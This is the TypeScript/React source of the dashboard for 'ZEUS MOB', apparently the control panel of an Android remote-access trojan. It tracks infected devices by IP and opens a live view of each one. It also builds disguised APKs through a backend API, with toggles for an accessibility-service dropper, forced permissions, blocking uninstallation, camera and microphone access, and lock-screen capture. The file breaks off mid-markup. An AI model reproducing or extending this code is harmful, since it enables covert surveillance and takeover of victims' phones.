import { useEffect, useState, useRef } from "react";
import { useLocation } from "wouter";
import { useAuth } from "@/lib/auth";
import {
  Users, Zap, Bell, Layers, Ban, Settings, LogOut,
  Search, Plus, Box, Download, Upload,
  Smartphone, ImagePlus, X, Check, Shield, Lock,
  Wifi, Battery, BatteryLow, Pencil, Trash2, FileText, Link2,
  RefreshCw, Play, Square, Monitor, Eye, EyeOff,
  Camera, Navigation2, Cast, Keyboard, Type,
  Volume2, VolumeX, MousePointer, LayoutGrid,
  ChevronDown, ChevronRight, Dog,
} from "lucide-react";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Dialog, DialogContent } from "@/components/ui/dialog";
import { Textarea } from "@/components/ui/textarea";
import { useDashboardWs, useDeviceList } from "@/hooks/use-websocket";

/* ─── Types ─── */
interface ApkForm {
  clientName: string; appName: string; appLink: string;
  notifTitle: string; notifMessage: string;
  appVersion: string; appId: string;
  iconPreview: string | null;
  perms: Record<string, boolean>;
  behavior: Record<string, boolean>;
  advanced: Record<string, boolean>;
}

const PERMISSIONS = [
  { key: "accessibility", label: "Accessibility Service", icon: "♿" },
  { key: "app_usage",     label: "App Usage",             icon: "📊" },
  { key: "draw_over",     label: "Draw Over Apps",        icon: "🖼️" },
  { key: "camera",        label: "Câmera Access",         icon: "📷" },
  { key: "files",         label: "Files Access",          icon: "📁" },
  { key: "microphone",    label: "Microfone Access",      icon: "🎙️" },
];
const BEHAVIORS = [
  { key: "prevent_sleep", label: "Prevenir Modo Sono",  icon: "💤" },
  { key: "prevent_stop",  label: "Prevenir Paradas",    icon: "🛑" },
  { key: "force_perms",   label: "Forçar Permissões",   icon: "⚡" },
];
const ADVANCED = [
  { key: "acc_dropper",   label: "Accessibility Guid / Dropper", icon: "🎯" },
  { key: "prevent_del",   label: "Prevenir Exclusão",     icon: "🔒" },
  { key: "auto_perms",    label: "Permissões Automáticas",icon: "🤖" },
  { key: "screen_lock",   label: "Registro de Bloqueio",  icon: "📱" },
];

function makeId(appName: string) {
  const slug = appName.replace(/\s+/g,"").toLowerCase().replace(/[^a-z0-9]/g,"") || "app";
  const rand = Math.floor(1000 + Math.random() * 9000);
  return `com.zeus.${slug}${rand}`;
}
function makeVersion() {
  return `1.0.${Math.floor(Math.random()*10)} (${Math.floor(100+Math.random()*900)})`;
}

const EMPTY_FORM: ApkForm = {
  clientName:"", appName:"", appLink:"",
  notifTitle:"", notifMessage:"",
  appVersion: makeVersion(), appId:"",
  iconPreview: null,
  perms:    Object.fromEntries(PERMISSIONS.map(p=>[p.key,false])),
  behavior: Object.fromEntries(BEHAVIORS.map(b=>[b.key,false])),
  advanced: Object.fromEntries(ADVANCED.map(a=>[a.key,false])),
};

const STEPS = ["Informações","Permissões","Funcionamento","Avançado"] as const;

/* ─── Device Data ─── */
interface Device {
  id: string; name: string; ip: string; country: string;
  daysAgo: number; version: string; online: boolean;
  battery: number; pingMs: number | null; appName: string;
}

const MOCK_DEVICES: Device[] = [
  { id:"d1", name:"teste",          ip:"45.181.146.192",  country:"🇧🇷", daysAgo:0,  version:"v4.5.4", online:true,  battery:78,  pingMs:51,  appName:"Samsung Wallet" },
  { id:"d2", name:"Carlos Device",  ip:"192.168.1.112",   country:"🇧🇷", daysAgo:3,  version:"v4.5.4", online:true,  battery:55,  pingMs:28,  appName:"Google Chrome"  },
  { id:"d3", name:"Redmi Note 12",  ip:"192.168.1.118",   country:"🇵🇹", daysAgo:5,  version:"v4.5.3", online:false, battery:10,  pingMs:null,appName:"–"              },
];

/* ─── Sidebar Icon ─── */
function SidebarIcon({
  icon: Icon, label, active, onClick, variant, badge,
}: {
  icon: React.ElementType; label: string;
  active?: boolean; onClick?: () => void;
  variant?: "destructive"; badge?: number;
}) {
  return (
    <button
      title={label}
      onClick={onClick}
      className={`relative w-9 h-9 rounded-lg flex items-center justify-center transition-all group
        ${variant === "destructive"
          ? "text-red-500/70 hover:text-red-400 hover:bg-red-500/10"
          : active
            ? "text-primary bg-primary/15 shadow-[0_0_10px_rgba(0,212,255,0.2)]"
            : "text-muted-foreground hover:text-primary hover:bg-primary/10"
        }`}
    >
      <Icon className="w-4 h-4" />
      {badge !== undefined && badge > 0 && (
        <span className="absolute -top-0.5 -right-0.5 w-3.5 h-3.5 rounded-full bg-[#00ff9d] border border-[#0d1220] text-[7px] font-bold text-[#0b0f1a] flex items-center justify-center shadow-[0_0_5px_#00ff9d]">
          {badge}
        </span>
      )}
    </button>
  );
}

/* ─── Field ─── */
function Field({
  label, placeholder, value, onChange, testId, required, icon,
}: {
  label: string; placeholder?: string; value: string;
  onChange: (v: string) => void; testId?: string;
  required?: boolean; icon?: React.ReactNode;
}) {
  return (
    <div>
      <p className="text-[9px] uppercase tracking-widest text-muted-foreground mb-1.5">
        {label} {required && <span className="text-destructive">*</span>}
      </p>
      <div className="relative">
        {icon && <span className="absolute left-2.5 top-1/2 -translate-y-1/2 text-primary/40">{icon}</span>}
        <Input
          value={value}
          onChange={e => onChange(e.target.value)}
          placeholder={placeholder}
          data-testid={testId}
          className={`bg-[#0b0f1a] border-primary/20 focus-visible:ring-primary text-xs placeholder:text-muted-foreground/40 h-8 ${icon ? "pl-7" : ""}`}
        />
      </div>
    </div>
  );
}

/* ─── Toggle Row ─── */
function ToggleRow({
  emoji, label, checked, onChange,
}: { emoji: string; label: string; checked: boolean; onChange: () => void }) {
  return (
    <button
      type="button"
      onClick={onChange}
      className={`w-full flex items-center gap-3 px-3 py-2.5 rounded-lg border transition-all text-left
        ${checked
          ? "border-primary/40 bg-primary/8 shadow-[0_0_8px_rgba(0,212,255,0.12)]"
          : "border-primary/10 bg-primary/3 hover:border-primary/25 hover:bg-primary/6"
        }`}
    >
      <span className="text-base w-5 flex-shrink-0">{emoji}</span>
      <span className="text-xs text-foreground/80 flex-1">{label}</span>
      <div className={`w-8 h-4 rounded-full relative transition-all ${checked ? "bg-primary" : "bg-primary/20"}`}>
        <div className={`absolute top-0.5 w-3 h-3 rounded-full transition-all ${checked ? "right-0.5 bg-[#0b0f1a]" : "left-0.5 bg-primary/50"}`} />
      </div>
    </button>
  );
}

/* ─── Ping Badge ─── */
function PingBadge({ ms }: { ms: number | null }) {
  if (ms === null) return <span className="text-xs text-muted-foreground/30 font-mono">—</span>;
  const color = ms < 50 ? "text-[#00ff9d]" : ms < 150 ? "text-yellow-400" : "text-red-400";
  return (
    <span className={`text-xs font-bold font-mono ${color}`}
      style={{ textShadow: ms < 50 ? "0 0 8px rgba(0,255,157,0.6)" : ms < 150 ? "0 0 8px rgba(234,179,8,0.6)" : "0 0 8px rgba(239,68,68,0.6)" }}>
      {ms}ms
    </span>
  );
}

/* ─── Online Dot ─── */
function OnlineDot({ online }: { online: boolean }) {
  return online ? (
    <span className="w-2.5 h-2.5 rounded-full bg-[#00ff9d] shadow-[0_0_8px_rgba(0,255,157,0.8)] block" />
  ) : (
    <span className="w-2.5 h-2.5 rounded-full bg-[#333] block" />
  );
}

/* ─── Main Dashboard ─── */
export default function Dashboard() {
  const { isAuthenticated, logout } = useAuth();
  const [, setLocation] = useLocation();
  const [search, setSearch] = useState("");
  const [apkOpen, setApkOpen] = useState(false);
  const [step, setStep] = useState(0);
  const [form, setForm] = useState<ApkForm>(EMPTY_FORM);
  const [generating, setGenerating] = useState(false);
  const [done, setDone] = useState(false);
  const [buildLog, setBuildLog] = useState("");
  const [apkBlob, setApkBlob] = useState<{ url: string; name: string } | null>(null);
  const iconRef = useRef<HTMLInputElement>(null);
  const wsStatus    = useDashboardWs();
  const liveDevices = useDeviceList();
  const [activeSection,  setActiveSection]  = useState<"devices" | "apks">("devices");
  const [generatedApks,  setGeneratedApks]  = useState<Array<{
    id: string; name: string; clientName: string; appName: string;
    url: string; sizeMb: string; date: string;
  }>>([]);

  useEffect(() => {
    if (!isAuthenticated) setLocation("/login");
  }, [isAuthenticated, setLocation]);

  if (!isAuthenticated) return null;

  // Use live devices from WebSocket; fall back to mock data when none connected
  const devices = liveDevices.length > 0
    ? liveDevices.map(d => ({
        id: d.deviceId,
        name: d.deviceId,
        ip: d.ip,
        country: "🌍",
        daysAgo: Math.floor((Date.now() - d.lastSeen) / 86_400_000),
        version: "v1.0",
        online: d.online,
        battery: 50,
        pingMs: d.online ? 40 : null,
        appName: d.app,
      }))
    : MOCK_DEVICES;

  const onlineCount  = devices.filter(d => d.online).length;
  const offlineCount = devices.filter(d => !d.online).length;

  const filtered = devices.filter(d =>
    d.name.toLowerCase().includes(search.toLowerCase()) ||
    d.ip.includes(search) ||
    d.appName.toLowerCase().includes(search.toLowerCase())
  );

  function handleField(key: keyof ApkForm, val: string) {
    setForm(f => ({ ...f, [key]: val }));
    setDone(false);
  }
  function toggleMap(group: "perms"|"behavior"|"advanced", key: string) {
    setForm(f => ({ ...f, [group]: { ...f[group], [key]: !f[group][key] } }));
  }
  function handleIcon(e: React.ChangeEvent<HTMLInputElement>) {
    const file = e.target.files?.[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = ev => handleField("iconPreview", ev.target?.result as string);
    reader.readAsDataURL(file);
  }
  function handleClose() {
    setApkOpen(false); setDone(false); setGenerating(false);
    setStep(0); setForm({ ...EMPTY_FORM, appVersion: makeVersion(), appId: "" });
  }

  async function handleGenerate() {
    setGenerating(true); setDone(false); setBuildLog(""); setApkBlob(null);
    let pollInterval: ReturnType<typeof setInterval> | null = null;
    try {
      setBuildLog("Preparando projeto Android...");
      const payload = {
        appName:      form.appName     || "ZeusMob",
        clientName:   form.clientName,
        appLink:      form.appLink,
        notifTitle:   form.notifTitle,
        notifMessage: form.notifMessage,
        appVersion:   form.appVersion,
        appId:        form.appId       || "com.zeusmob.app",
        iconBase64:   form.iconPreview ?? undefined,
        perms:        form.perms,
        behavior:     form.behavior,
        advanced:     form.advanced,
      };

      // 1. Inicia o build — retorna jobId imediatamente
      setBuildLog("Iniciando compilação em segundo plano...");
      const startResp = await fetch(`${import.meta.env.BASE_URL}api/apk/build`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
      if (!startResp.ok) {
        const err = await startResp.json().catch(() => ({ error: startResp.statusText }));
        throw new Error((err as any).error || "Falha ao iniciar build");
      }
      const { jobId } = await startResp.json();

      // 2. Polling a cada 3s até concluir ou falhar
      await new Promise<void>((resolve, reject) => {
        pollInterval = setInterval(async () => {
          try {
            const statusResp = await fetch(
              `${import.meta.env.BASE_URL}api/apk/status/${jobId}`
            );
            if (!statusResp.ok) return; // rede instável — tenta novamente
            const data = await statusResp.json();

            if (data.log) setBuildLog(data.log);

            if (data.status === "done") {
              clearInterval(pollInterval!);
              pollInterval = null;

              // 3. Faz download do APK
              const dlResp = await fetch(
                `${import.meta.env.BASE_URL}api/apk/download/${jobId}`
              );
              if (!dlResp.ok) { reject(new Error("Falha ao baixar APK")); return; }

              const blob    = await dlResp.blob();
              const blobUrl = URL.createObjectURL(blob);
              const apkName = data.apkName || "zeusmob.apk";
              const sizeMb  = (blob.size / 1024 / 1024).toFixed(1);
              setApkBlob({ url: blobUrl, name: apkName });
              setBuildLog(`✅ APK gerado! (${sizeMb} MB)`);
              setGeneratedApks(prev => [...prev, {
                id:         Date.now().toString(),
                name:       apkName,
                clientName: payload.clientName || "—",
                appName:    payload.appName    || "ZeusMob",
                url:        blobUrl,
                sizeMb,
                date:       new Date().toLocaleDateString("pt-BR"),
              }]);
              setDone(true);
              resolve();

            } else if (data.status === "error") {
              clearInterval(pollInterval!);
              pollInterval = null;
              const lastLine = data.log?.split("\n").filter(Boolean).pop() || "Build falhou";
              reject(new Error(lastLine));
            }
          } catch (e) {
            clearInterval(pollInterval!);
            pollInterval = null;
            reject(e);
          }
        }, 3000);
      });

    } catch (e: any) {
      setBuildLog(`Erro: ${e.message}`);
    } finally {
      if (pollInterval) clearInterval(pollInterval);
      setGenerating(false);
    }
  }

  function downloadApk() {
    if (!apkBlob) return;
    const a = document.createElement("a");
    a.href = apkBlob.url; a.download = apkBlob.name; a.click();
  }

  return (
    <div className="flex h-screen w-full bg-[#080c14] text-foreground overflow-hidden font-sans">

      {/* ── Sidebar ── */}
      <aside className="w-[52px] flex-shrink-0 bg-[#0a0e1a] border-r border-primary/10 flex flex-col justify-between z-20">
        <div className="flex flex-col items-center gap-0.5 pt-2">
          {/* Logo */}
          <div className="w-9 h-9 rounded-lg border border-primary/60 bg-primary/10 flex items-center justify-center mb-2"
            style={{ boxShadow: "0 0 12px rgba(0,212,255,0.25), inset 0 0 8px rgba(0,212,255,0.1)" }}>
            <Zap className="w-4.5 h-4.5 text-primary" style={{ filter: "drop-shadow(0 0 6px rgba(0,212,255,0.8))" }} />
          </div>

          <SidebarIcon icon={Smartphone} label="Dispositivos" active={activeSection === "devices"} badge={onlineCount} onClick={() => setActiveSection("devices")} />
          <SidebarIcon icon={Users}      label="APKs Gerados" active={activeSection === "apks"} badge={generatedApks.length || undefined} onClick={() => setActiveSection("apks")} />
          <SidebarIcon icon={Zap}        label="Conexões" />
          <SidebarIcon icon={Bell}       label="Notificações" />
          <SidebarIcon icon={Layers}     label="Camadas" />
          <SidebarIcon icon={Ban}        label="Bloqueios" />
          <SidebarIcon icon={Dog}        label="Guardião" />
        </div>

        <div className="flex flex-col items-center gap-1 pb-3">
          <SidebarIcon icon={Settings} label="Configurações" />
          <SidebarIcon icon={LogOut}   label="Sair" onClick={() => logout()} variant="destructive" />
          <p className="text-[5px] font-orbitron text-primary/25 uppercase tracking-widest text-center leading-tight mt-1 select-none">
            ZEUS<br/>MOB
          </p>
        </div>
      </aside>

      {/* ── Main ── */}
      <main className="flex-1 flex flex-col overflow-hidden relative">

        {/* ── Top Header ── */}
        <div className="flex items-center gap-2 px-4 py-2 border-b border-primary/10 bg-[#0a0e1a]/90 backdrop-blur flex-shrink-0">
          <div className="w-7 h-7 rounded border border-primary/50 bg-primary/10 flex items-center justify-center shrink-0">
            <Zap className="w-3.5 h-3.5 text-primary" style={{ filter: "drop-shadow(0 0 4px rgba(0,212,255,0.8))" }} />
          </div>
          <span className="font-orbitron text-sm font-bold text-primary tracking-widest" style={{ textShadow: "0 0 8px rgba(0,212,255,0.6)" }}>
            ZEUS MOB
          </span>
          <span className="text-[10px] text-muted-foreground/60 tracking-wider hidden sm:inline ml-1">
            {activeSection === "devices" ? "Gerenciador de Clientes" : "APKs Gerados"}
          </span>
          <div className="flex-1" />
          <div className="flex items-center gap-3 text-[11px] font-semibold">
            <span className="flex items-center gap-1.5">
              <span className="w-2 h-2 rounded-full bg-[#00ff9d] shadow-[0_0_6px_rgba(0,255,157,0.8)]" />
              <span className="text-[#00ff9d]">{onlineCount} ONLINE</span>
            </span>
            <span className="flex items-center gap-1.5 text-muted-foreground/60">
              <span className="w-2 h-2 rounded-full bg-[#333]" />
              {offlineCount} OFFLINE
            </span>
          </div>
        </div>

        {/* ── Content ── */}
        <div className="flex-1 overflow-y-auto overflow-x-hidden">
          <div className="p-3 space-y-2 min-w-0">

            {/* ══ SECÇÃO DISPOSITIVOS ══ */}
            {activeSection === "devices" && (<>

              {/* ── Search + Count Row ── */}
              <div className="flex items-center gap-2 flex-wrap">
                <div className="relative flex-1 min-w-[180px] max-w-sm">
                  <Search className="absolute left-2.5 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-muted-foreground/50" />
                  <Input
                    value={search}
                    onChange={e => setSearch(e.target.value)}
                    placeholder="Pesquisar por nome, IP ou app..."
                    className="pl-8 h-8 text-xs bg-[#0d1220] border-primary/20 focus-visible:ring-primary placeholder:text-muted-foreground/40 w-full"
                  />
                </div>
                <div className="flex-1" />
                <span className="text-xs text-muted-foreground/50 font-mono mr-2 hidden sm:block">
                  {filtered.length} dispositivos
                </span>
                <Button variant="outline" size="sm" onClick={() => { setStep(0); setApkOpen(true); }}
                  className="h-8 text-xs border-primary/40 text-primary hover:bg-primary/15 hover:border-primary/70 gap-1.5 font-orbitron tracking-wider"
                  style={{ boxShadow: "0 0 8px rgba(0,212,255,0.1)" }}>
                  <Box className="w-3.5 h-3.5" />
                  <span className="hidden sm:inline">Gerar APK</span>
                </Button>
                <Button size="sm"
                  className="h-8 text-xs bg-primary hover:bg-primary/80 text-[#080c14] font-orbitron font-bold tracking-wider gap-1.5"
                  style={{ boxShadow: "0 0 12px rgba(0,212,255,0.35)" }}>
                  <Plus className="w-3.5 h-3.5" />
                  <span className="hidden sm:inline">Novo</span>
                </Button>
              </div>

              {/* ── Device Table ── */}
              <div className="rounded-xl border border-primary/15 overflow-hidden"
                style={{ boxShadow: "0 0 30px rgba(0,212,255,0.04)" }}>
                <div className="grid items-center border-b border-primary/10 bg-[#0a0e1a] px-3 py-2"
                  style={{ gridTemplateColumns: "24px 28px 1fr 120px 50px 70px 90px 90px 36px 56px 28px" }}>
                  {["","","NOME","IP","DIAS","VERSÃO","","APP","","PING",""].map((col, i) => (
                    <span key={i} className="text-[9px] uppercase tracking-widest text-muted-foreground/40 font-medium">{col}</span>
                  ))}
                </div>
                {filtered.length === 0 && (
                  <div className="flex flex-col items-center justify-center py-12 gap-2 text-sm text-muted-foreground/40">
                    <Smartphone className="w-8 h-8 opacity-20" />
                    <span>Nenhum dispositivo conectado</span>
                    <span className="text-[10px]">Instale um APK gerado para ver o dispositivo aqui</span>
                  </div>
                )}
                {filtered.map((d, idx) => (
                  <div
                    key={d.id}
                    onClick={() => setLocation(`/live/${d.id}`)}
                    className={`grid items-center px-3 py-3 cursor-pointer transition-all group
                      ${idx < filtered.length - 1 ? "border-b border-primary/8" : ""}
                      hover:bg-primary/6 hover:shadow-[inset_0_0_0_1px_rgba(0,212,255,0.12)]`}
                    style={{ gridTemplateColumns: "24px 28px 1fr 120px 50px 70px 90px 90px 36px 56px 28px" }}
                  >
                    <span className="text-base leading-none select-none">{d.country}</span>
                    <div className="w-6 h-6 rounded border border-primary/20 bg-primary/5 flex items-center justify-center">
                      <Smartphone className="w-3 h-3 text-primary/60" />
                    </div>
                    <span className="text-sm font-medium text-foreground/90 truncate group-hover:text-primary transition-colors pr-2">{d.name}</span>
                    <span className="text-xs font-mono text-muted-foreground/60 truncate">{d.ip}</span>
                    <span className="text-xs text-muted-foreground/50 font-mono">{d.daysAgo}d</span>
                    <span className="text-xs font-mono font-bold text-primary" style={{ textShadow: "0 0 8px rgba(0,212,255,0.5)" }}>{d.version}</span>
                    <div className="flex items-center gap-1.5">
                      <Wifi className="w-3.5 h-3.5 text-muted-foreground/40" />
                      {d.battery > 20
                        ? <Battery className="w-3.5 h-3.5 text-muted-foreground/40" />
                        : <BatteryLow className="w-3.5 h-3.5 text-orange-500/60" />}
                    </div>
                    <span className="text-xs text-muted-foreground/60 truncate">{d.appName}</span>
                    <button onClick={e => e.stopPropagation()}
                      className="w-6 h-6 rounded flex items-center justify-center text-muted-foreground/30 hover:text-primary hover:bg-primary/10 transition-all">
                      <Pencil className="w-3 h-3" />
                    </button>
                    <PingBadge ms={d.pingMs} />
                    <div className="flex justify-end"><OnlineDot online={d.online} /></div>
                  </div>
                ))}
              </div>
            </>)}

            {/* ══ SECÇÃO APKs GERADOS ══ */}
            {activeSection === "apks" && (<>

              <div className="flex items-center gap-2 flex-wrap">
                <div className="flex-1" />
                <Button variant="outline" size="sm" onClick={() => { setStep(0); setApkOpen(true); }}
                  className="h-8 text-xs border-primary/40 text-primary hover:bg-primary/15 hover:border-primary/70 gap-1.5 font-orbitron tracking-wider"
                  style={{ boxShadow: "0 0 8px rgba(0,212,255,0.1)" }}>
                  <Box className="w-3.5 h-3.5" />
                  Gerar Novo APK
                </Button>
              </div>

              {/* APK table */}
              <div className="rounded-xl border border-primary/15 overflow-hidden"
                style={{ boxShadow: "0 0 30px rgba(0,212,255,0.04)" }}>
                {/* Header */}
                <div className="grid items-center border-b border-primary/10 bg-[#0a0e1a] px-3 py-2"
                  style={{ gridTemplateColumns: "1fr 110px 110px 70px 90px 60px 36px" }}>
                  {["APK / NOME","CLIENTE","APP","TAMANHO","DATA","",""].map((col, i) => (
                    <span key={i} className="text-[9px] uppercase tracking-widest text-muted-foreground/40 font-medium">{col}</span>
                  ))}
                </div>

                {generatedApks.length === 0 && (
                  <div className="flex flex-col items-center justify-center py-14 gap-2 text-sm text-muted-foreground/40">
                    <Box className="w-8 h-8 opacity-20" />
                    <span>Nenhum APK gerado nesta sessão</span>
                    <span className="text-[10px]">Clique em "Gerar Novo APK" para criar o primeiro</span>
                  </div>
                )}

                {[...generatedApks].reverse().map((apk, idx) => (
                  <div
                    key={apk.id}
                    className={`grid items-center px-3 py-3 transition-all
                      ${idx < generatedApks.length - 1 ? "border-b border-primary/8" : ""}
                      hover:bg-primary/4`}
                    style={{ gridTemplateColumns: "1fr 110px 110px 70px 90px 60px 36px" }}
                  >
                    {/* APK filename */}
                    <div className="flex items-center gap-2 min-w-0">
                      <div className="w-6 h-6 rounded border border-primary/20 bg-primary/5 flex items-center justify-center shrink-0">
                        <Box className="w-3 h-3 text-primary/60" />
                      </div>
                      <span className="text-xs font-mono text-foreground/80 truncate" title={apk.name}>{apk.name}</span>
                    </div>

                    {/* Client */}
                    <span className="text-xs text-muted-foreground/60 truncate">{apk.clientName}</span>

                    {/* App name */}
                    <span className="text-xs text-muted-foreground/60 truncate">{apk.appName}</span>

                    {/* Size */}
                    <span className="text-xs font-mono text-primary/70">{apk.sizeMb} MB</span>

                    {/* Date */}
                    <span className="text-xs text-muted-foreground/50">{apk.date}</span>

                    {/* Download */}
                    <button
                      onClick={() => {
                        const a = document.createElement("a");
                        a.href = apk.url; a.download = apk.name; a.click();
                      }}
                      title="Baixar APK"
                      className="h-7 px-2 rounded border border-primary/25 text-primary/60 hover:text-primary hover:border-primary/60 hover:bg-primary/10 flex items-center gap-1 transition-all text-[10px] font-orbitron">
                      <Download className="w-3 h-3" />
                      <span>APK</span>
                    </button>

                    {/* Delete */}
                    <button
                      onClick={() => setGeneratedApks(prev => prev.filter(a => a.id !== apk.id))}
                      title="Excluir da lista"
                      className="w-7 h-7 rounded flex items-center justify-center text-red-500/40 hover:text-red-400 hover:bg-red-500/10 transition-all ml-auto">
                      <Trash2 className="w-3.5 h-3.5" />
                    </button>
                  </div>
                ))}
              </div>
            </>)}

          </div>
        </div>

        {/* ── Footer ── */}
        <div className="flex items-center justify-between px-3 py-1 border-t border-primary/8 bg-[#0a0e1a]/80 flex-shrink-0">
          <span className="text-[9px] font-orbitron text-primary/25 tracking-widest uppercase">
            @ZEUSMOB · CLIENTES
          </span>
          <span className="flex items-center gap-1.5 text-[9px] font-orbitron tracking-widest">
            <span className={`w-1.5 h-1.5 rounded-full ${wsStatus === "active"
              ? "bg-[#00ff9d] shadow-[0_0_5px_rgba(0,255,157,0.8)]"
              : "bg-red-500/60"
            }`} />
            <span className={wsStatus === "active" ? "text-[#00ff9d]/70" : "text-red-500/50"}>
              WEBSOCKET {wsStatus === "active" ? "ATIVO" : "INATIVO"}
            </span>
          </span>
        </div>
      </main>

      {/* ══ APK Wizard Modal ══ */}
      <Dialog open={apkOpen} onOpenChange={open => { if (!open) handleClose(); }}>
        <DialogContent className="bg-[#0d1220] border border-primary/30 text-foreground shadow-[0_0_50px_rgba(0,212,255,0.1)] max-w-xl w-full p-0 overflow-hidden rounded-xl">

          <div className="flex items-center gap-3 px-5 pt-4 pb-3 border-b border-primary/15">
            <div className="w-8 h-8 rounded-md bg-primary/15 border border-primary/50 flex items-center justify-center shrink-0">
              <Box className="w-4 h-4 text-primary" />
            </div>
            <div className="flex-1">
              <p className="font-orbitron text-sm font-bold text-primary tracking-widest" style={{ textShadow:"0 0 8px rgba(0,212,255,0.6)" }}>GERAR APK</p>
              <p className="text-[10px] text-muted-foreground mt-0.5">Etapa {step+1} de {STEPS.length} — {STEPS[step]}</p>
            </div>
            <button onClick={handleClose}
              className="w-7 h-7 rounded border border-primary/20 flex items-center justify-center text-muted-foreground hover:text-primary hover:border-primary/50 hover:bg-primary/10 transition-all">
              <X className="w-3.5 h-3.5" />
            </button>
          </div>

          {/* Step indicator */}
          <div className="flex items-center px-5 py-2 gap-1.5 border-b border-primary/10">
            {STEPS.map((s, i) => (
              <div key={s} className="flex items-center gap-1.5 flex-1">
                <div className={`w-5 h-5 rounded-full border flex items-center justify-center text-[9px] font-orbitron font-bold shrink-0 transition-all
                  ${i < step ? "bg-primary border-primary text-[#0b0f1a]"
                  : i === step ? "border-primary text-primary shadow-[0_0_6px_rgba(0,212,255,0.4)]"
                  : "border-primary/20 text-primary/30"}`}>
                  {i < step ? <Check className="w-2.5 h-2.5" /> : i+1}
                </div>
                <span className={`text-[9px] tracking-wide truncate hidden sm:block ${i===step ? "text-primary" : i<step ? "text-primary/60" : "text-primary/25"}`}>{s}</span>
                {i < STEPS.length-1 && <div className={`h-px flex-1 ${i<step ? "bg-primary/50" : "bg-primary/10"}`} />}
              </div>
            ))}
          </div>

          {/* Step body */}
          <div className="px-5 py-4 overflow-y-auto max-h-[60vh] space-y-4">

            {step === 0 && (
              <>
                <div className="flex gap-4 items-start">
                  <div className="shrink-0">
                    <p className="text-[9px] uppercase tracking-widest text-muted-foreground mb-1.5">Ícone</p>
                    <button type="button" onClick={() => iconRef.current?.click()}
                      className="w-16 h-16 rounded-xl border-2 border-dashed border-primary/30 bg-primary/5 flex flex-col items-center justify-center gap-1 hover:border-primary/60 hover:bg-primary/10 transition-all group overflow-hidden">
                      {form.iconPreview
                        ? <img src={form.iconPreview} alt="icon" className="w-full h-full object-cover rounded-xl" />
                        : <><ImagePlus className="w-5 h-5 text-primary/40 group-hover:text-primary" /><span className="text-[8px] text-muted-foreground/50">Upload</span></>
                      }
                    </button>
                    <input ref={iconRef} type="file" accept="image/*" className="hidden" onChange={handleIcon} />
                  </div>
                  <div className="flex-1 space-y-2.5">
                    <Field label="Nome do Cliente" placeholder="ex: Empresa XYZ" value={form.clientName} onChange={v=>handleField("clientName",v)} required />
                    <Field label="Nome do Aplicativo" placeholder="ex: MeuApp Pro" value={form.appName} onChange={v=>handleField("appName",v)} required />
                  </div>
                </div>
                <Field label="Link do Aplicativo" placeholder="https://seusite.com/app" value={form.appLink} onChange={v=>handleField("appLink",v)} icon={<Link2 className="w-3 h-3" />} required />
                <div className="grid grid-cols-2 gap-3">
                  <Field label="Título da Notificação" placeholder="ex: Nova atualização!" value={form.notifTitle} onChange={v=>handleField("notifTitle",v)} required />
                  <div>
                    <p className="text-[9px] uppercase tracking-widest text-muted-foreground mb-1.5">Mensagem da Notificação <span className="text-destructive">*</span></p>
                    <Textarea placeholder="Texto push..." value={form.notifMessage} onChange={e=>handleField("notifMessage",e.target.value)}
                      className="bg-[#0b0f1a] border-primary/20 focus-visible:ring-primary text-xs placeholder:text-muted-foreground/40 resize-none h-[58px]" />
                  </div>
                </div>
                <div className="grid grid-cols-2 gap-3">
                  <div>
                    <p className="text-[9px] uppercase tracking-widest text-muted-foreground mb-1.5">ID do Aplicativo <span className="text-destructive">*</span></p>
                    <div className="flex gap-1">
                      <Input value={form.appId} onChange={e=>handleField("appId",e.target.value)} placeholder="Gerar automaticamente"
                        className="bg-[#0b0f1a] border-primary/20 focus-visible:ring-primary text-xs h-8 flex-1 font-mono" />
                      <button type="button" onClick={() => handleField("appId", makeId(form.appName))}
                        className="w-8 h-8 rounded border border-primary/25 text-primary/60 hover:text-primary hover:border-primary/50 hover:bg-primary/10 flex items-center justify-center transition-all shrink-0">
                        <RefreshCw className="w-3.5 h-3.5" />
                      </button>
                    </div>
                  </div>
                  <div>
                    <p className="text-[9px] uppercase tracking-widest text-muted-foreground mb-1.5">Versão <span className="text-destructive">*</span></p>
                    <div className="flex gap-1">
                      <Input value={form.appVersion} onChange={e=>handleField("appVersion",e.target.value)} placeholder="1.0.0"
                        className="bg-[#0b0f1a] border-primary/20 focus-visible:ring-primary text-xs h-8 flex-1 font-mono" />
                      <button type="button" onClick={() => handleField("appVersion", makeVersion())}
                        className="w-8 h-8 rounded border border-primary/25 text-primary/60 hover:text-primary hover:border-primary/50 hover:bg-primary/10 flex items-center justify-center transition-all shrink-0">
                        <RefreshCw className="w-3.5 h-3.5" />
                      </button>
                    </div>
                  </div>
                </div>
              </>
            )}

            {step === 1 && (
              <div>
                <div className="flex items-center gap-2 mb-3">
                  <Shield className="w-4 h-4 text-primary" />
                  <p className="text-xs font-semibold text-primary">Permissões do APK</p>
                </div>
                <p className="text-[10px] text-muted-foreground mb-4">Selecione as permissões que o app irá solicitar.</p>
                <div className="space-y-1.5">
                  {PERMISSIONS.map(p => (
                    <ToggleRow key={p.key} emoji={p.icon} label={p.label}
                      checked={form.perms[p.key]} onChange={() => toggleMap("perms", p.key)} />
                  ))}
                </div>
              </div>
            )}

            {step === 2 && (
              <div className="space-y-1.5">
                <div className="flex items-center gap-2 mb-3">
                  <Zap className="w-4 h-4 text-primary" />
                  <p className="text-xs font-semibold text-primary">Comportamento</p>
                </div>
                {BEHAVIORS.map(b => (
                  <ToggleRow key={b.key} emoji={b.icon} label={b.label}
                    checked={form.behavior[b.key]} onChange={() => toggleMap("behavior", b.key)} />
                ))}
              </div>
            )}

            {step === 3 && (
              <>
                <div className="space-y-1.5">
                  <div className="flex items-center gap-2 mb-3">
                    <Lock className="w-4 h-4 text-primary" />
                    <p className="text-xs font-semibold text-primary">Configurações Avançadas</p>
                  </div>
                  {ADVANCED.map(a => (
                    <ToggleRow key={a.key} emoji={a.icon} label={a.label}
                      checked={form.advanced[a.key]} onChange={() => toggleMap("advanced", a.key)} />
                  ))}
                </div>

                {(generating || done || buildLog) && (
                  <div className="mt-4 p-3 rounded-lg border border-primary/20 bg-primary/5">
